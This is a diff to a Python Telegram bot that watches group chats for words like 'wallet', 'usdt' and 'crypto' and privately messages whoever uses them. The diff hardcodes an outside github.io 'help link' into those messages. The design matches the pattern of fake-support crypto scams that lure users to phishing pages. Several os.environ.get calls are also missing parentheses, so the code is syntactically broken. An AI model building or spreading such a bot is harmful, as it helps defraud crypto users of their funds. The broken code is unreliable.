@@ -20,8 +20,8 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 # Environment variables (✅ DO NOT put your token here)
-TOKEN = os.environ.get("TELEGRAM_TOKEN")
-HELP_LINK = os.environ.get"HELP_LINK", "https://example.com/help"
+TOKEN = os.environ.get"TELEGRAM_TOKEN"
+HELP_LINK = os.environ.get"HELP_LINK", "https://alari12.github.io/MindCarePLC/"
 TRIGGERS = os.environ.get"TRIGGERS", "wallet,usdt,crypto,sol,help"
 TRIGGER_WORDS = [t.strip().lower() for t in TRIGGERS.split(",") if t.strip()]
 
@@ -38,7 +38,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # /help command
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(f"Here’s your help link: {HELP_LINK}")
+    await update.message.reply_text(f"Here’s your help link:https://alari12.github.io/MindCarePLC/")
 
 # Monitor group messages
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -55,7 +55,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user = update.message.from_user
             user_id = user.id
             first = user.first_name or "there"
-            dm_text = f"Hey {first}, I noticed you mentioned '{word}'. For help click: {HELP_LINK}"
+            dm_text = f"Hey {first}, I noticed you mentioned '{word}'. For help click:https://alari12.github.io/MindCarePLC/"
 
             try:
                 await context.bot.send_message(chat_id=user_id, text=dm_text)
